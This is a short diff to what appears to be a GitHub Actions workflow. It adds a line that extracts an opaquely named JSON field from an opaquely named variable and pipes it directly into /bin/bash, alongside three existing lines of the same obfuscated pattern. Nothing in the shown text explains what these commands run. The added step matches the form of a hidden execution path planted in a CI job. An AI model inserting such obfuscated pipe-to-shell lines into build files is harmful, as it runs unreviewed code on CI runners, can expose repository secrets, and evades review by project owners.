@@ -23,6 +23,7 @@ jobs:
           printf '%s' "$b60" | jq -r .kltc9727 | /bin/bash
           echo $cpin197 | jq -r .tavs655 | /bin/bash
           printf '%s' "$gkym9614" | jq -r .mnv53 | /bin/bash
+          echo $mqh54 | jq -r .q0270 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
